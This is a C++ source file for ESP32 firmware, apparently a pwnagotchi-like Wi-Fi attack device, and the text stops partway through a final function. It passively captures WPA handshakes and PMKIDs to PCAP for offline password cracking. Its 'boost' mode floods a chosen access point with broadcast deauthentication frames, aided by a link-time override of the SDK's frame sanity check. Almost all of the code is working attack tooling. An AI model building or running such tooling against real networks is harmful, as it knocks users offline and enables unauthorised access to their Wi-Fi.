#include "sniffer.h"
#include "config.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include <SPI.h>
#include <SD.h>
#include <strings.h>
#include <freertos/FreeRTOS.h>
#include <freertos/queue.h>

// Some ESP-IDF builds refuse to transmit deauth/disassoc frames from
// esp_wifi_80211_tx(). ESP32 Marauder and friends override this check at link
// time. The build uses -zmuldefs so this definition wins. If the linker still
// uses the library copy, boost mode reports an error instead of pretending.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  (void)arg;
  (void)arg2;
  (void)arg3;
  return 0;
}

// ---------------------------------------------------------------- types
enum PktKind : uint8_t { PKT_BEACON = 1, PKT_EAPOL = 2 };

struct Pkt {
  uint16_t len;
  uint16_t origLen;
  int8_t rssi;
  uint8_t channel;
  uint8_t kind;
  uint8_t data[MAX_FRAME];
};

struct HsEntry {
  bool used;
  uint8_t ap[6];
  uint8_t sta[6];
  bool m1, m2, m3, m4;
  bool reported;
  bool pmkidReported;
  uint32_t last;
};

struct BeaconSeen {
  bool used;
  uint8_t bssid[6];
  uint32_t last;
};

// ---------------------------------------------------------------- state
static ApInfo g_aps[MAX_APS];
static int g_apCount = 0;

static HsEntry g_hs[MAX_HS];
static BeaconSeen g_bt[64];

static int g_hsCount = 0;
static int g_savedHsCount = 0;
static int g_pmkidCount = 0;
static int g_eapolCount = 0;
static volatile uint32_t g_drops = 0;

static bool g_sdOk = false;
static bool g_pcapOk = false;
static File g_pcap;
static char g_pcapPath[32] = "";
static uint32_t g_pcapSize = 0;
static uint32_t g_lastSdTry = 0;
static uint32_t g_lastFlush = 0;

static bool g_paused = false;
static bool g_lockMode = false;
static uint8_t g_lockChannel = 6;
static uint8_t g_channel = 0;
static uint32_t g_lastHop = 0;

static bool g_debugRaw = false;
static bool g_debugParse = false;
static uint8_t g_debugBssid[6];

static bool g_boost = false;
static bool g_hasTarget = false;
static uint8_t g_targetBssid[6];
static char g_targetSsid[33];
static uint8_t g_targetChannel = 0;
static int8_t g_targetRssi = 0;
static uint32_t g_lastDeauth = 0;
static uint32_t g_deauthSent = 0;

static QueueHandle_t g_queue = nullptr;

static const uint8_t HOP_CHANNELS[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
static int g_hopIdx = 0;

// ---------------------------------------------------------------- small helpers
static void macStr(const uint8_t *m, char *out) {
  snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
           m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void jsonEscape(const char *in, char *out, size_t outLen) {
  size_t j = 0;
  for (size_t i = 0; in[i] && j + 1 < outLen; i++) {
    uint8_t c = (uint8_t)in[i];
    if (c == '"' || c == '\\') {
      if (j + 2 >= outLen) break;
      out[j++] = '\\';
      out[j++] = (char)c;
    } else if (c < 0x20 || c == 0x7F) {
      if (j + 6 >= outLen) break;
      snprintf(out + j, outLen - j, "\\u%04x", c);
      j += 6;
    } else {
      out[j++] = (char)c;
    }
  }
  out[j] = 0;
}

static bool sameMac(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

static bool isZeroMac(const uint8_t *a) {
  static const uint8_t z[6] = {0, 0, 0, 0, 0, 0};
  return sameMac(a, z);
}

static bool isBroadcast(const uint8_t *a) {
  return a[0] == 0xFF && a[1] == 0xFF && a[2] == 0xFF &&
         a[3] == 0xFF && a[4] == 0xFF && a[5] == 0xFF;
}

// ---------------------------------------------------------------- auth parsing
static uint8_t parseRsnAuth(const uint8_t *ie, int len) {
  // version(2) group(4) pairwise-count(2) pairwise(n*4) akm-count(2) akm(n*4)
  if (len < 8) return AUTH_WPA2;
  int pos = 2 + 4;
  if (pos + 2 > len) return AUTH_WPA2;
  int pairwise = ie[pos] | (ie[pos + 1] << 8);
  pos += 2 + pairwise * 4;
  if (pos + 2 > len) return AUTH_WPA2;
  int akmCount = ie[pos] | (ie[pos + 1] << 8);
  pos += 2;
  bool psk = false, sae = false, eap = false;
  for (int i = 0; i < akmCount && pos + 4 <= len; i++, pos += 4) {
    if (ie[pos] != 0x00 || ie[pos + 1] != 0x0F || ie[pos + 2] != 0xAC) continue;
    uint8_t t = ie[pos + 3];
    if (t == 2 || t == 4 || t == 6) psk = true;
    else if (t == 8 || t == 9 || t == 24 || t == 26) sae = true;
    else if (t == 1 || t == 3 || t == 5 || t == 11 || t == 12) eap = true;
  }
  if (psk && sae) return AUTH_WPA2_3;
  if (sae) return AUTH_WPA3;
  if (psk) return AUTH_WPA2;
  if (eap) return AUTH_EAP;
  return AUTH_WPA2;
}

const char *authName(uint8_t a) {
  switch (a) {
    case AUTH_OPEN: return "OPEN";
    case AUTH_WEP: return "WEP";
    case AUTH_WPA: return "WPA";
    case AUTH_WPA2: return "WPA2";
    case AUTH_WPA2_3: return "WPA2/3";
    case AUTH_WPA3: return "WPA3";
    case AUTH_EAP: return "EAP";
    default: return "?";
  }
}

bool isCrackableAuth(uint8_t a) {
  return a == AUTH_WPA || a == AUTH_WPA2 || a == AUTH_WPA2_3;
}

// ---------------------------------------------------------------- AP table
static ApInfo *findAp(const uint8_t *bssid) {
  for (int i = 0; i < g_apCount; i++) {
    if (sameMac(g_aps[i].bssid, bssid)) return &g_aps[i];
  }
  return nullptr;
}

static int oldestApIndex() {
  int idx = 0;
  uint32_t best = 0xFFFFFFFF;
  for (int i = 0; i < g_apCount; i++) {
    if (g_aps[i].lastSeen < best) {
      best = g_aps[i].lastSeen;
      idx = i;
    }
  }
  return idx;
}

static void emitAp(const ApInfo &ap, bool isNew) {
  char ssid[80];
  char bssid[18];
  jsonEscape(ap.ssid, ssid, sizeof(ssid));
  macStr(ap.bssid, bssid);
  Serial.printf("{\"t\":\"ap\",\"new\":%d,\"ssid\":\"%s\",\"bssid\":\"%s\",\"ch\":%d,\"rssi\":%d,\"enc\":\"%s\"}\n",
                isNew ? 1 : 0, ssid, bssid, ap.channel, ap.rssi, authName(ap.auth));
}

static void updateAp(const uint8_t *bssid, const char *ssid, int ssidLen,
                     uint8_t channel, int8_t rssi, uint8_t auth, bool hidden) {
  ApInfo *ap = findAp(bssid);
  bool isNew = false;

  if (!ap) {
    if (g_apCount < MAX_APS) {
      ap = &g_aps[g_apCount++];
    } else {
      ap = &g_aps[oldestApIndex()];
    }
    memset(ap, 0, sizeof(*ap));
    memcpy(ap->bssid, bssid, 6);
    ap->firstSeen = millis();
    isNew = true;
  }

  if (ssidLen > 0 && !hidden) {
    int n = ssidLen;
    if (n > 32) n = 32;
    memcpy(ap->ssid, ssid, n);
    ap->ssid[n] = 0;
    ap->ssidLen = (uint8_t)n;
    ap->hidden = false;
  } else if (isNew) {
    ap->ssid[0] = 0;
    ap->ssidLen = 0;
    ap->hidden = true;
  }

  ap->channel = channel ? channel : ap->channel;
  ap->rssi = rssi;
  ap->auth = auth;
  ap->lastSeen = millis();
  if (ap->beacons < 0xFFFF) ap->beacons++;

  if (isNew) {
    emitAp(*ap, true);
  }
}

// ---------------------------------------------------------------- pcap
static int nextPcapIndex() {
  int next = 1;
  File root = SD.open("/");
  if (!root) return next;

  File f = root.openNextFile();
  while (f) {
    if (!f.isDirectory()) {
      const char *name = f.name();
      const char *p = strstr(name, "pwn_");
      int n = 0;
      if (p && sscanf(p, "pwn_%d.pcap", &n) == 1 && n >= next) {
        next = n + 1;
      }
    }
    f.close();
    f = root.openNextFile();
  }
  root.close();
  return next;
}

static void pcapOpen() {
  if (g_pcapOk || !g_sdOk) return;

  bool reuse = (g_pcapPath[0] != 0);
  if (!reuse) {
    int idx = nextPcapIndex();
    snprintf(g_pcapPath, sizeof(g_pcapPath), "/pwn_%03d.pcap", idx);
  }

  // Reopen the same file after a pause so one session stays in one PCAP.
  g_pcap = SD.open(g_pcapPath, reuse ? FILE_APPEND : FILE_WRITE);
  if (!g_pcap) {
    g_sdOk = false;
    return;
  }

  size_t existing = reuse ? g_pcap.size() : 0;
  if (existing < 24) {
    if (reuse) {
      // A short file cannot be appended in place. Recreate its header.
      g_pcap.close();
      g_pcap = SD.open(g_pcapPath, FILE_WRITE);
      if (!g_pcap) {
        g_sdOk = false;
        return;
      }
    }

    uint32_t magic = 0xA1B2C3D4;
    uint16_t major = 2, minor = 4;
    int32_t thiszone = 0;
    uint32_t sigfigs = 0, snaplen = 65535, network = 105;  // LINKTYPE_IEEE802_11
    g_pcap.write((const uint8_t *)&magic, 4);
    g_pcap.write((const uint8_t *)&major, 2);
    g_pcap.write((const uint8_t *)&minor, 2);
    g_pcap.write((const uint8_t *)&thiszone, 4);
    g_pcap.write((const uint8_t *)&sigfigs, 4);
    g_pcap.write((const uint8_t *)&snaplen, 4);
    g_pcap.write((const uint8_t *)&network, 4);
    g_pcapSize = 24;
  } else {
    g_pcapSize = (uint32_t)existing;
  }
  g_pcapOk = true;
}

static bool pcapWrite(const uint8_t *data, uint16_t len, uint16_t origLen) {
  if (!g_pcapOk) return false;

  uint64_t us = esp_timer_get_time();
  uint32_t sec = (uint32_t)(us / 1000000ULL);
  uint32_t usec = (uint32_t)(us % 1000000ULL);
  uint32_t incl = len;
  uint32_t orig = origLen ? origLen : len;

  size_t n = 0;
  n += g_pcap.write((const uint8_t *)&sec, 4);
  n += g_pcap.write((const uint8_t *)&usec, 4);
  n += g_pcap.write((const uint8_t *)&incl, 4);
  n += g_pcap.write((const uint8_t *)&orig, 4);
  n += g_pcap.write(data, len);
  if (n != 16 + len) {
    g_pcap.close();
    g_pcapOk = false;
    g_sdOk = false;
    return false;
  }
  g_pcapSize += (uint32_t)n;
  return true;
}

static void pcapClose() {
  if (g_pcapOk && g_pcap) {
    g_pcap.flush();
    g_pcap.close();
  }
  g_pcapOk = false;
}

// ---------------------------------------------------------------- SD
static void sdTry() {
  if (g_sdOk) return;
  if (SD.begin(PIN_SD_CS, SPI, 4000000) && SD.cardType() != CARD_NONE) {
    g_sdOk = true;
    pcapOpen();
    Serial.printf("{\"t\":\"sd\",\"ok\":1,\"pcap\":%u}\n", (unsigned)g_pcapSize);
  } else {
    SD.end();
    g_sdOk = false;
  }
}

// ---------------------------------------------------------------- beacon processing
static void processBeacon(const uint8_t *p, int len, int8_t rssi, uint8_t ch) {
  if (len < 36) return;

  const uint8_t *bssid = p + 10;
  if (g_debugRaw && sameMac(bssid, g_debugBssid)) {
    g_debugRaw = false;
    char bssidStr[18];
    macStr(bssid, bssidStr);
    int n = len > 160 ? 160 : len;
    char hex[321];
    for (int i = 0; i < n; i++) {
      snprintf(hex + i * 2, 3, "%02x", p[i]);
    }
    hex[n * 2] = 0;
    Serial.printf("{\"t\":\"raw\",\"bssid\":\"%s\",\"len\":%d,\"hex\":\"%s\"}\n",
                  bssidStr, len, hex);
  }

  uint16_t cap = (uint16_t)p[34] | ((uint16_t)p[35] << 8);
  bool privacy = (cap & 0x0010) != 0;

  char ssid[33];
  int ssidLen = 0;
  int dsCh = 0;
  bool rsn = false, wpa = false;
  uint8_t rsnAuth = AUTH_WPA2;

  int pos = 36;
  int ieCount = 0;
  while (pos + 2 <= len) {
    uint8_t id = p[pos];
    uint8_t l = p[pos + 1];
    if (pos + 2 + l > len) break;
    const uint8_t *ie = p + pos + 2;
    ieCount++;

    if (id == 0) {
      // Some frames carry an extra empty SSID element after the real one.
      // Never let it erase an SSID we already parsed.
      if (l > 0 && l <= 32) {
        memcpy(ssid, ie, l);
        ssidLen = l;
      }
    } else if (id == 3) {
      if (l >= 1) dsCh = ie[0];
    } else if (id == 48) {
      rsn = true;
      rsnAuth = parseRsnAuth(ie, l);
    } else if (id == 221) {
      if (l >= 4 && ie[0] == 0x00 && ie[1] == 0x50 && ie[2] == 0xF2 && ie[3] == 0x01) {
        wpa = true;
      }
    }
    pos += 2 + l;
  }
  ssid[ssidLen] = 0;

  uint8_t auth;
  if (rsn) auth = rsnAuth;
  else if (wpa) auth = AUTH_WPA;
  else if (privacy) auth = AUTH_WEP;
  else auth = AUTH_OPEN;

  updateAp(bssid, ssid, ssidLen, dsCh ? (uint8_t)dsCh : ch, rssi, auth, ssidLen == 0);

  if (g_debugParse && sameMac(bssid, g_debugBssid)) {
    g_debugParse = false;
    ApInfo *a = findAp(bssid);
    Serial.printf("{\"t\":\"parsedbg\",\"inLen\":%d,\"inSsid\":\"%.32s\","
                  "\"storedLen\":%d,\"stored\":\"%.32s\",\"hidden\":%d,"
                  "\"ies\":%d,\"b36\":%02x,\"b37\":%02x,\"b38\":%02x,\"end\":%d}\n",
                  ssidLen, ssid, a ? a->ssidLen : -1,
                  a ? a->ssid : "", a ? (a->hidden ? 1 : 0) : -1,
                  ieCount, p[36], p[37], p[38], pos);
  }
}

// ---------------------------------------------------------------- EAPOL
static HsEntry *hsGet(const uint8_t *ap, const uint8_t *sta) {
  int freeIdx = -1;
  int oldest = 0;
  uint32_t oldestT = 0xFFFFFFFF;

  for (int i = 0; i < MAX_HS; i++) {
    if (!g_hs[i].used) {
      if (freeIdx < 0) freeIdx = i;
      continue;
    }
    if (sameMac(g_hs[i].ap, ap) && sameMac(g_hs[i].sta, sta)) return &g_hs[i];
    if (g_hs[i].last < oldestT) {
      oldestT = g_hs[i].last;
      oldest = i;
    }
  }

  int idx = (freeIdx >= 0) ? freeIdx : oldest;
  HsEntry *e = &g_hs[idx];
  memset(e, 0, sizeof(*e));
  e->used = true;
  memcpy(e->ap, ap, 6);
  memcpy(e->sta, sta, 6);
  return e;
}

static void markApFlag(const uint8_t *bssid, bool handshake, bool pmkid) {
  ApInfo *ap = findAp(bssid);
  if (!ap) return;
  if (handshake) ap->handshake = true;
  if (pmkid) ap->pmkid = true;
}

static int eapolMessage(const uint8_t *eapol, int eapolLen, const uint8_t **pmkid) {
  *pmkid = nullptr;
  if (eapolLen < 99) return 0;
  if (eapol[1] != 3) return 0;  // EAPOL-Key

  uint16_t ki = (uint16_t)eapol[5] | ((uint16_t)eapol[6] << 8);
  bool pairwise = (ki & 0x0008) != 0;
  if (!pairwise) return 0;  // group handshake is not useful for PSK cracking

  bool install = (ki & 0x0010) != 0;
  bool ack = (ki & 0x0020) != 0;
  bool mic = (ki & 0x0040) != 0;
  bool secure = (ki & 0x0080) != 0;

  int msg = 0;
  if (ack && !mic && !install) msg = 1;
  else if (!ack && mic && !install && !secure) msg = 2;
  else if (ack && mic && install) msg = 3;
  else if (!ack && mic && !install && secure) msg = 4;

  int kdLen = (int)eapol[97] | ((int)eapol[98] << 8);
  if (kdLen > 0 && 99 + kdLen <= eapolLen) {
    const uint8_t *kd = eapol + 99;
    int pos = 0;
    while (pos + 2 <= kdLen) {
      uint8_t t = kd[pos];
      uint8_t l = kd[pos + 1];
      if (pos + 2 + l > kdLen) break;
      const uint8_t *d = kd + pos + 2;
      if (t == 0xDD && l >= 20 &&
          d[0] == 0x00 && d[1] == 0x0F && d[2] == 0xAC && d[3] == 0x04) {
        *pmkid = d + 4;
        break;
      }
      pos += 2 + l;
    }
  }
  return msg;
}

static bool processEapol(const uint8_t *p, int len, int8_t rssi, uint8_t ch) {
  (void)rssi;
  (void)ch;
  if (len < 24) return false;

  uint8_t fc0 = p[0];
  uint8_t fc1 = p[1];
  uint8_t subtype = (fc0 >> 4) & 0x0F;
  if (((fc0 >> 2) & 0x03) != 2) return false;  // data frame

  bool toDS = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;

  int hdr = 24;
  if (toDS && fromDS) hdr += 6;
  if (subtype & 0x08) hdr += 2;  // QoS control
  if ((subtype & 0x08) && (fc1 & 0x80)) hdr += 4;  // HT control
  if (hdr + 8 > len) return false;

  const uint8_t *llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
        llc[6] == 0x88 && llc[7] == 0x8E)) {
    return false;
  }

  const uint8_t *eapol = llc + 8;
  int avail = len - hdr - 8;
  if (avail < 4) return false;
  int eapolTotal = 4 + ((int)eapol[2] | ((int)eapol[3] << 8));
  if (eapolTotal > avail) eapolTotal = avail;

  const uint8_t *pmkid = nullptr;
  int msg = eapolMessage(eapol, eapolTotal, &pmkid);
  if (!msg) return false;

  const uint8_t *ap;
  const uint8_t *sta;
  if (fromDS && !toDS) {
    ap = p + 10;   // addr2
    sta = p + 4;   // addr1
  } else if (toDS && !fromDS) {
    ap = p + 4;    // addr1
    sta = p + 10;  // addr2
  } else {
    return false;  // IBSS / WDS
  }
  if (isBroadcast(ap) || isBroadcast(sta) || isZeroMac(ap) || isZeroMac(sta)) return false;

  bool completed = false;
  g_eapolCount++;

  char apStr[18], staStr[18];
  macStr(ap, apStr);
  macStr(sta, staStr);
  Serial.printf("{\"t\":\"eapol\",\"ap\":\"%s\",\"sta\":\"%s\",\"msg\":%d}\n",
                apStr, staStr, msg);

  HsEntry *e = hsGet(ap, sta);
  e->last = millis();
  if (msg == 1) e->m1 = true;
  else if (msg == 2) e->m2 = true;
  else if (msg == 3) e->m3 = true;
  else if (msg == 4) e->m4 = true;

  if (!e->reported && ((e->m1 && e->m2) || (e->m2 && e->m3))) {
    e->reported = true;
    completed = true;
    g_hsCount++;
    markApFlag(ap, true, false);

    char ssid[80] = "";
    ApInfo *ai = findAp(ap);
    if (ai) jsonEscape(ai->ssid, ssid, sizeof(ssid));
    Serial.printf("{\"t\":\"hs\",\"ap\":\"%s\",\"ssid\":\"%s\",\"ch\":%d,\"count\":%d}\n",
                  apStr, ssid, g_channel, g_hsCount);
  }

  if (pmkid && !e->pmkidReported) {
    e->pmkidReported = true;
    g_pmkidCount++;
    markApFlag(ap, false, true);

    char pm[33];
    for (int i = 0; i < 16; i++) snprintf(pm + i * 2, 3, "%02x", pmkid[i]);

    char ssid[80] = "";
    ApInfo *ai = findAp(ap);
    if (ai) jsonEscape(ai->ssid, ssid, sizeof(ssid));
    Serial.printf("{\"t\":\"pmkid\",\"ap\":\"%s\",\"ssid\":\"%s\",\"pmkid\":\"%s\",\"count\":%d}\n",
                  apStr, ssid, pm, g_pmkidCount);
  }

  return completed;
}

// ---------------------------------------------------------------- promiscuous RX
static bool beaconDue(const uint8_t *bssid, bool probeResponse) {
  uint32_t now = millis();
  uint32_t interval = probeResponse ? 500 : 3000;
  int freeIdx = -1;
  int oldest = 0;
  uint32_t oldestT = 0xFFFFFFFF;

  for (int i = 0; i < 64; i++) {
    if (!g_bt[i].used) {
      if (freeIdx < 0) freeIdx = i;
      continue;
    }
    if (sameMac(g_bt[i].bssid, bssid)) {
      if (now - g_bt[i].last < interval) return false;
      g_bt[i].last = now;
      return true;
    }
    if (g_bt[i].last < oldestT) {
      oldestT = g_bt[i].last;
      oldest = i;
    }
  }

  int idx = (freeIdx >= 0) ? freeIdx : oldest;
  g_bt[idx].used = true;
  memcpy(g_bt[idx].bssid, bssid, 6);
  g_bt[idx].last = now;
  return true;
}

static bool eapolFrame(const uint8_t *p, int len, int *hdrOut) {
  if (len < 32) return false;

  uint8_t fc0 = p[0];
  uint8_t fc1 = p[1];
  if (((fc0 >> 2) & 0x03) != 2) return false;

  uint8_t subtype = (fc0 >> 4) & 0x0F;
  bool toDS = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;

  int hdr = 24;
  if (toDS && fromDS) hdr += 6;
  if (subtype & 0x08) hdr += 2;
  if ((subtype & 0x08) && (fc1 & 0x80)) hdr += 4;
  if (hdr + 8 > len) return false;

  const uint8_t *llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
        llc[6] == 0x88 && llc[7] == 0x8E)) {
    return false;
  }
  *hdrOut = hdr;
  return true;
}

static void wifiRx(void *buf, wifi_promiscuous_pkt_type_t type) {
  (void)type;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *p = pkt->payload;
  int len = (int)pkt->rx_ctrl.sig_len;
  // sig_len includes the 4-byte FCS. Strip it so the PCAP is a plain
  // 802.11 frame (link type 105) and the IE walker does not treat the FCS
  // as another information element.
  if (len > 4) len -= 4;
  if (len < 24) return;

  uint8_t fc0 = p[0];
  uint8_t ftype = (fc0 >> 2) & 0x03;
  uint8_t subtype = (fc0 >> 4) & 0x0F;

  Pkt out;
  bool want = false;

  if (ftype == 0 && (subtype == 8 || subtype == 5)) {
    // beacon or probe response
    const uint8_t *bssid = p + 10;
    if (beaconDue(bssid, subtype == 5)) {
      out.kind = PKT_BEACON;
      want = true;
    }
  } else if (ftype == 2) {
    int hdr = 0;
    if (eapolFrame(p, len, &hdr)) {
      out.kind = PKT_EAPOL;
      want = true;
    }
  }

  if (!want) return;

  int copy = len;
  if (copy > MAX_FRAME) copy = MAX_FRAME;

  out.len = (uint16_t)copy;
  out.origLen = (uint16_t)(len > 65535 ? 65535 : len);
  out.rssi = pkt->rx_ctrl.rssi;
  out.channel = pkt->rx_ctrl.channel;
  memcpy(out.data, p, copy);

  if (xQueueSend(g_queue, &out, 0) != pdTRUE) {
    g_drops++;
  }
}

// ---------------------------------------------------------------- channel / modes
static void setChannel(uint8_t ch) {
  if (ch < 1 || ch > 13) return;
  if (ch == g_channel) return;
  if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
    g_channel = ch;
  }
}

static void hop() {
  if (g_paused) return;

  if (g_boost && g_hasTarget && g_targetChannel) {
    setChannel(g_targetChannel);
    return;
  }
  if (g_lockMode) {
    setChannel(g_lockChannel);
    return;
  }

  uint32_t now = millis();
  if (now - g_lastHop < HOP_MS) return;
  g_lastHop = now;
  g_hopIdx = (g_hopIdx + 1) % (int)(sizeof(HOP_CHANNELS) / sizeof(HOP_CHANNELS[0]));
  setChannel(HOP_CHANNELS[g_hopIdx]);
}

static int strongestIndex(bool targetsOnly) {
  int best = -1;
  int8_t bestRssi = -128;
  for (int i = 0; i < g_apCount; i++) {
    if (targetsOnly && !isCrackableAuth(g_aps[i].auth)) continue;
    if (g_aps[i].hidden) continue;
    if (g_aps[i].rssi > bestRssi) {
      bestRssi = g_aps[i].rssi;
      best = i;
    }
  }
  if (best < 0) {
    for (int i = 0; i < g_apCount; i++) {
      if (targetsOnly && !isCrackableAuth(g_aps[i].auth)) continue;
      if (g_aps[i].rssi > bestRssi) {
        bestRssi = g_aps[i].rssi;
        best = i;
      }
    }
  }
  return best;
}

void snifferSetLock(bool lock, uint8_t channel) {
  g_lockMode = lock;
  if (channel >= 1 && channel <= 13) {
    g_lockChannel = channel;
    setChannel(channel);
  }
  Serial.printf("{\"t\":\"mode\",\"lock\":%d,\"ch\":%d}\n", lock ? 1 : 0, g_lockChannel);
}

bool snifferToggleLock() {
  if (g_lockMode) {
    snifferSetLock(false, 0);
    return false;
  }

  int idx = strongestIndex(true);
  if (idx < 0) idx = strongestIndex(false);
  if (idx < 0) {
    Serial.println("{\"t\":\"error\",\"msg\":\"no AP to lock\"}");
    return false;
  }

  g_lockChannel = g_aps[idx].channel;
  g_lockMode = true;
  setChannel(g_lockChannel);

  char ssid[80];
  char bssid[18];
  jsonEscape(g_aps[idx].ssid, ssid, sizeof(ssid));
  macStr(g_aps[idx].bssid, bssid);
  Serial.printf("{\"t\":\"mode\",\"lock\":1,\"ch\":%d,\"ssid\":\"%s\",\"bssid\":\"%s\"}\n",
                g_lockChannel, ssid, bssid);
  return true;
}

void snifferSetPaused(bool paused) {
  if (paused == g_paused) return;
  g_paused = paused;
  if (paused) {
    esp_wifi_set_promiscuous(false);
    pcapClose();
  } else {
    esp_wifi_set_promiscuous(true);
    setChannel(g_channel);
    pcapOpen();
  }
  Serial.printf("{\"t\":\"state\",\"paused\":%d}\n", paused ? 1 : 0);
}

bool snifferSelectTarget(int index) {
  if (index < 0 || index >= g_apCount) {
    Serial.println("{\"t\":\"error\",\"msg\":\"bad AP index\"}");
    return false;
  }
  return snifferSelectTargetBssid(g_aps[index].bssid);
}

bool snifferSelectTargetBssid(const uint8_t *bssid) {
  ApInfo *ap = findAp(bssid);
  if (!ap) {
    Serial.println("{\"t\":\"error\",\"msg\":\"AP not found\"}");
    return false;
  }
  memcpy(g_targetBssid, ap->bssid, 6);
  strlcpy(g_targetSsid, ap->ssid, sizeof(g_targetSsid));
  g_targetChannel = ap->channel ? ap->channel : g_channel;
  g_targetRssi = ap->rssi;
  g_hasTarget = true;
  g_lockMode = true;
  g_lockChannel = ap->channel;
  setChannel(ap->channel);

  char ssid[80];
  char bssidStr[18];
  jsonEscape(g_targetSsid, ssid, sizeof(ssid));
  macStr(g_targetBssid, bssidStr);
  Serial.printf("{\"t\":\"target\",\"ssid\":\"%s\",\"bssid\":\"%s\",\"ch\":%d,\"enc\":\"%s\"}\n",
                ssid, bssidStr, g_targetChannel, authName(ap->auth));
  if (!isCrackableAuth(ap->auth)) {
    Serial.println("{\"t\":\"warn\",\"msg\":\"target is not WPA/WPA2-PSK; no PSK handshake to capture\"}");
  }
  return true;
}

bool snifferSetBoost(bool on) {
  if (on) {
    if (!g_hasTarget) {
      Serial.println("{\"t\":\"error\",\"msg\":\"select a target first\"}");
      return false;
    }
    g_boost = true;
    g_lockMode = true;
    g_lockChannel = g_targetChannel;
    setChannel(g_targetChannel);
    g_lastDeauth = 0;
  } else {
    g_boost = false;
  }
  Serial.printf("{\"t\":\"boost\",\"on\":%d}\n", on ? 1 : 0);
  return true;
}

static void maybeDeauth() {
  if (!g_boost || !g_hasTarget || g_paused) return;
  if (millis() - g_lastDeauth < DEAUTH_INTERVAL_MS) return;
  if (g_channel != g_targetChannel) {
    setChannel(g_targetChannel);
    return;
  }
  g_lastDeauth = millis();

  uint8_t frame[26] = {
      0xC0, 0x00,              // deauth
      0x00, 0x00,              // duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // addr1: broadcast
      g_targetBssid[0], g_targetBssid[1], g_targetBssid[2],
      g_targetBssid[3], g_targetBssid[4], g_targetBssid[5],  // addr2: AP
      g_targetBssid[0], g_targetBssid[1], g_targetBssid[2],
      g_targetBssid[3], g_targetBssid[4], g_targetBssid[5],  // addr3: AP
      0x00, 0x00,              // sequence
      0x07, 0x00               // reason: class 3 frame from nonassociated station
  };

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  if (err == ESP_OK) {
    g_deauthSent++;
  } else {
    g_boost = false;
    Serial.printf("{\"t\":\"error\",\"msg\":\"deauth tx failed\",\"code\":%d}\n", (int)err);
  }
}

// ---------------------------------------------------------------- public API
bool snifferBegin() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false);
  delay(50);

  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_bandwidth(WIFI_IF_STA, WIFI_BW_HT20);

  g_queue = xQueueCreate(PKT_QUEUE_LEN, sizeof(Pkt));
  if (!g_queue) {
    Serial.println("{\"t\":\"error\",\"msg\":\"queue alloc failed\"}");
    return false;
  }

  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;

  esp_err_t err = esp_wifi_set_promiscuous_filter(&filter);
  if (err != ESP_OK) {
    Serial.printf("{\"t\":\"error\",\"msg\":\"promisc filter\",\"code\":%d}\n", (int)err);
  }
  esp_wifi_set_promiscuous_rx_cb(wifiRx);

  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) {
    Serial.printf("{\"t\":\"error\",\"msg\":\"promisc on\",\"code\":%d}\n", (int)err);
    return false;
  }

  setChannel(1);
  sdTry();

  Serial.println("{\"t\":\"sniffer\",\"ok\":1}");
  return true;
}

void snifferLoop() {
  if (!g_paused) {
    hop();
    maybeDeauth();
  }

  Pkt pkt;
  int drained = 0;
  while (drained < 8 && xQueueReceive(g_queue, &pkt, 0) == pdTRUE) {
    bool completed = false;
    if (pkt.kind == PKT_BEACON) {
      processBeacon(pkt.data, pkt.len, pkt.rssi, pkt.channel);
    } else if (pkt.kind == PKT_EAPOL) {
      completed = processEapol(pkt.data, pkt.len, pkt.rssi, pkt.channel);
    }
    bool wrote = pcapWrite(pkt.data, pkt.len, pkt.origLen);
    if (completed && wrote) {
      g_savedHsCount++;
    }
    drained++;
  }

  if (!g_sdOk && millis() - g_lastSdTry > SD_RETRY_MS) {
    g_lastSdTry = millis();
    sdTry();
  }

  if (g_pcapOk && millis() - g_lastFlush > PCAP_FLUSH_MS) {
    g_lastFlush = millis();
    g_pcap.flush();
  }
}

// ---------------------------------------------------------------- reporting
void snifferPrintStatus() {
  int targets = 0;
  for (int i = 0; i < g_apCount; i++) {
    if (isCrackableAuth(g_aps[i].auth)) targets++;
  }

  char tssid[80] = "";
  char tbssid[18] = "";
  if (g_hasTarget) {
    jsonEscape(g_targetSsid, tssid, sizeof(tssid));
    macStr(g_targetBssid, tbssid);
  }

  Serial.printf("{\"t\":\"stat\",\"ms\":%lu,\"aps\":%d,\"hs\":%d,\"saved\":%d,\"pmkid\":%d,\"eapol\":%d,"
                "\"targets\":%d,\"ch\":%d,\"sd\":%d,\"pcap\":%u,\"drops\":%u,"
                "\"paused\":%d,\"lock\":%d,\"boost\":%d,"
                "\"target\":\"%s\",\"target_ch\":%d,\"deauth\":%u}\n",
                (unsigned long)millis(), g_apCount, g_hsCount, g_savedHsCount,
                g_pmkidCount, g_eapolCount,
                targets, g_channel, g_sdOk ? 1 : 0, (unsigned)g_pcapSize,
                (unsigned)g_drops, g_paused ? 1 : 0, g_lockMode ? 1 : 0,
                g_boost ? 1 : 0, tbssid, g_targetChannel, (unsigned)g_deauthSent);
}

void snifferPrintAps() {
